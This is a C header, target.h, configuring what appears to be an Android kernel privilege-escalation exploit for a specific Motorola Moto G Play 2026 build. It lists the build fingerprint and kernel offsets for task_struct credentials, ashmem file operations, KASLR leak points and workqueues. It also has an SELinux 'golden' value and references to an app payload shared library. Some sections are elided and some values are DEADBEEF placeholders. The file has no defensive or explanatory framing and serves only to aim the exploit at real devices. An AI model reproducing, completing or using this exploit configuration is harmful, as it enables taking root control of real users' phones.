/* target.h – Motorola Moto G Play 2026 (XT2615-1, TracFone)
 * Kernel: 5.15.189-android13-8-00018-g9c82b71884fd
 * MediaTek MTK, 39-bit VA
 * All offsets filled in – no oracle, clean build.
 */
#ifndef TARGET_H
#define TARGET_H

#define BUILD_VARIANT_LABEL "MOTO_NEVADA_MTK"
#define BUILD_FINGERPRINT "motorola/nevada_g_sys/nevada:16/W1WNS36.18-111-3/fd36ab-9de45b:user/release-keys"
...
#define TASK_STRUCT_CRED_OFF         0x820ULL
#define TASK_STRUCT_REAL_CRED_OFF    0x818ULL
#define FAKE_TASK_TASK_GROUP_OFF     0x348ULL

/* ═══════════════════════════════════════════════════════════════════════════
 * ASHMEM – all offsets from kernel
 * ═══════════════════════════════════════════════════════════════════════════ */
#define ASHMEM_IOCTL_OFF             0x0000000001142738ULL
#define ASHMEM_COMPAT_IOCTL_OFF      0x0000000001142de8ULL
#define ASHMEM_MMAP_OFF              0x0000000001142e48ULL
#define ASHMEM_OPEN_OFF              0x0000000001143138ULL
#define ASHMEM_RELEASE_OFF           0x00000000011431d8ULL
#define ASHMEM_SHOW_FDINFO_OFF       0x00000000011432fcULL
#define ASHMEM_FOPS_OFF              0x0000000002106448ULL
#define ASHMEM_MISC_OFF              0x0000000002c91b70ULL
#define ASHMEM_MISC_FOPS_OFF         0x0000000002c91b80ULL   /* misc + 0x10 */

/* ═══════════════════════════════════════════════════════════════════════════
 * CONFIGFS / PIPE / VFS (leave as DEADBEEF)
 * ═══════════════════════════════════════════════════════════════════════════ */
...
/* ═══════════════════════════════════════════════════════════════════════════
 * SLIDE – KASLR leak detection (only offsets, common.h defines aliases)
 * ═══════════════════════════════════════════════════════════════════════════ */
#define SLIDE_NFULNL_LOGGER_NAME_OFF         0x0000000002b01e28ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF       0x0000000002b01e28ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0xDEADBEEF
#define SLIDE_SYSCTL_BOOTID_OFF              0x0000000002dc6819ULL
#define SLIDE_TRACEFS_WORKER_CALLER_OFF      0x0000000000178e78ULL

/* ═══════════════════════════════════════════════════════════════════════════
 * SLIDE image addresses – computed from offsets
 * ═══════════════════════════════════════════════════════════════════════════ */
...
/* SLIDE_BANK constants (needed for APP_PAYLOAD, but harmless) */
...
#define SLIDE_PSELECT_NFDS              0x400
...
/* APP_PAYLOAD specific constants (needed for the .so build) */
...
/* ═══════════════════════════════════════════════════════════════════════════
 * Workqueue offsets (GKI 5.15 stable)
 * ═══════════════════════════════════════════════════════════════════════════ */
...
/* ═══════════════════════════════════════════════════════════════════════════
 * Computed addresses – no oracle, no P0_FINGERPRINT
 * ═══════════════════════════════════════════════════════════════════════════ */
...
#define TARGET_SELINUX_GOLDEN { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF }
